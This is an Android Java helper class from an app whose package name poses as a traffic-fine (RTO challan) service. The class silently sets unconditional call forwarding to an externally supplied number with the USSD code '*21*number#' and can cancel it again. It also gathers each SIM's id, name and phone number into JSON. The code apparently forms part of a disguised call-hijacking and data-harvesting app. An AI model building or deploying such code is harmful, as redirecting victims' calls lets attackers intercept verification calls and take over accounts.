package com.service.rtochallan;

import static android.content.Context.TELEPHONY_SERVICE;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class CallForwardingHelper {

    private static final String TAG = "CallForwardingHelper";

    /** Callback interface for async results */
    public interface CallForwardingCallback {
        void onSuccess(String message) throws JSONException;
        void onFailure(String error) throws JSONException;
    }

    /** -----------------------------
     *  Set Call Forwarding
     * ----------------------------- */
    public static void setCallForwarding(Context context, String phoneNumber, int simSubId,  CallForwardingCallback callback) throws JSONException {

        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            callback.onFailure("Missing CALL_PHONE permission");
            return;
        }

        // Determine SIM subscription ID
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        List<SubscriptionInfo> activeSubs = subscriptionManager.getActiveSubscriptionInfoList();
        boolean valid = false;
        assert activeSubs != null;
        for (SubscriptionInfo info : activeSubs) {
            if (info.getSubscriptionId() == simSubId) {
                valid = true;
                break;
            }
        }
        if (!valid) {
            callback.onFailure("Invalid SIM subscription id");
            return;
        }

        String ussdRequest = "*21*" + phoneNumber + "#";
        Handler handler = new Handler(Looper.getMainLooper());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            TelephonyManager managerForSubId = manager.createForSubscriptionId(simSubId);
            managerForSubId.sendUssdRequest(ussdRequest, new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    try {
                        callback.onSuccess("Call forwarding set successfully: " + response);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    try {
                        callback.onFailure("Failed to set call forwarding (code " + failureCode + ")");
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }, handler);
        } else {
            callback.onFailure("Requires Android 8.0 (Oreo) or higher");
        }
    }

    /** -----------------------------
     *  Remove Call Forwarding
     * ----------------------------- */
    public static void removeCallForwarding(Context context, int simSubId, CallForwardingCallback callback) throws JSONException {

        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            callback.onFailure("Missing CALL_PHONE permission");
            return;
        }

        // Determine SIM subscription ID
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        List<SubscriptionInfo> activeSubs = subscriptionManager.getActiveSubscriptionInfoList();
        boolean valid = false;
        assert activeSubs != null;
        for (SubscriptionInfo info : activeSubs) {
            if (info.getSubscriptionId() == simSubId) {
                valid = true;
                break;
            }
        }
        if (!valid) {
            callback.onFailure("Invalid SIM subscription id");
            return;
        }

        String ussdRequest = "#21#";
        Handler handler = new Handler(Looper.getMainLooper());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            TelephonyManager managerForSubId = manager.createForSubscriptionId(simSubId);
            managerForSubId.sendUssdRequest(ussdRequest, new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    try {
                        callback.onSuccess("" + response);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    try {
                        callback.onFailure("CallForwardFailureCode " + failureCode);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            }, handler);
        } else {
            callback.onFailure("Requires Android 8.0 (Oreo) or higher");
        }
    }

    /** -----------------------------
     *  Get SIM Details (unchanged)
     * ----------------------------- */
    public static String getSimDetails(Context context) throws JSONException {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, "Permission to read phone state is required.", Toast.LENGTH_SHORT).show();
            return "";
        }

        JSONObject simData = new JSONObject();
        List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
        if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
            for (SubscriptionInfo subscriptionInfo : activeSubscriptions) {
                JSONObject simRow = new JSONObject();
                simRow.put("sim_id", subscriptionInfo.getSubscriptionId());
                simRow.put("sim_name", subscriptionInfo.getDisplayName().toString());
                simRow.put("sim_number", subscriptionInfo.getNumber() != null ? subscriptionInfo.getNumber() : "N/A");
                simData.put(String.valueOf(subscriptionInfo.getSubscriptionId()), simRow);
            }
            return simData.toString();
        } else {
            Toast.makeText(context, "No active subscriptions found.", Toast.LENGTH_SHORT).show();
            return "No active subscriptions found";
        }
    }
}
